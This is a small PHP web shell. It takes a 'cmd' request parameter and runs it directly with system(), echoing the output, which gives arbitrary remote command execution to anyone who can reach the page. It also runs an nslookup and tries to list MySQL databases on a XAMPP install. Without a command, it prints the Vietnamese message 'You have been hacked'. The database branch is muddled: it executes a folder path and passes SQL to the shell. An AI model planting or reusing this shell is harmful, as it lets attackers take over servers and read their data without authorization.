<?php
require 'trycap.php';
if(isset($_REQUEST['cmd'])) {
	echo '<pre>';
	$cmd = $_REQUEST['cmd'];
	echo($cmd);
	$lookcmd = system($cmd);
	echo($lookcmd);
	echo "<br/>";
	$domain = 'http://localhost';
	$lookup = system("nslookup {$domain}");
	echo($lookup);

	$ketnoidata = 'c:\xampp\mysql\bin';
	if ($ketnoidata == $cmd) {
		$st = exec('c:\xampp\mysql\bin');
		echo($st);

		echo '<pre>';
		$show = 'SHOW DATABASES;';
		$databas = system($show);
		echo($databas);
		echo '</pre>';
	}
	echo '</pre>';
}else {
	echo "Bạn đã bị hack";
}

?>